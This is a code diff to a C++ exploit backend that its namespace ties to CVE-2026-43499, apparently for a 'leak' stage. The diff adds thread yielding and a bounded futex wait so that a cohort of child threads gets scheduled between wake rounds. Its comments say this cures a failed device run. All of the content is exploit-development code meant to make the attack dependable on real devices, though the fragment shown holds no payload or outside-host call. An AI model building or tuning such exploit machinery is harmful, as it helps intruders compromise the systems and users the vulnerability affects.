@@ -33,10 +33,19 @@
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::leak {
+    /** How many times the parent yields between rounds of handing out times. Mechanism: it is
+     *  how long a round gives the cohort to run, and the retired tree got the same effect by
+     *  sleeping on the futex. */
+    inline constexpr std::size_t kRoundsOfYielding = 64U;
     /** How long the parent is willing to hand out times. */
     struct SnitchPatience final {
         /** How many rounds of waking before it gives up. */
         std::uint32_t wake_rounds = 0U;
+        /** How long each round waits for the count to move, in microseconds. The retired
+         *  tree slept on the futex between rounds, and a first device run showed why it
+         *  mattered: without a wait, eight rounds of waking finished before the cohort had
+         *  been scheduled, and the search gave up on a count that was climbing. */
+        std::int64_t round_timeout_us = 0;
     };
 
     /** How the protocol ended. */
@@ -168,6 +177,20 @@ namespace ghostlock::backend::cve_2026_43499::leak {
             const std::uint32_t owed = static_cast<std::uint32_t>(wanted - poked);
             for (std::size_t i = 0U; i < cohort; ++i) {
                 (void) Seam::futex_wake_private(words[i], static_cast<std::int32_t>(owed));
+            }
+            /* Give the cohort a chance to run. The retired tree slept on the futex here, and
+             *  this port first did not: a device showed eight rounds of waking and returning
+             *  finishing inside a microsecond, with the children never scheduled even once,
+             *  and the search reporting that nothing had poked. Yielding is the part of
+             *  sleeping that matters here -- the parent has nothing to wait on until its
+             *  children have run. */
+            for (std::size_t i = 0U; i < kRoundsOfYielding; ++i) {
+                (void) Seam::yield_now();
+            }
+            if (patience.round_timeout_us > 0) {
+                /* Sleep on the count itself, bounded, and wake early if anyone wakes it. */
+                (void) Seam::futex_wait_private_until(const_cast<std::uint32_t *>(counter), poked,
+                                                      patience.round_timeout_us);
             }
             ++round;
         }
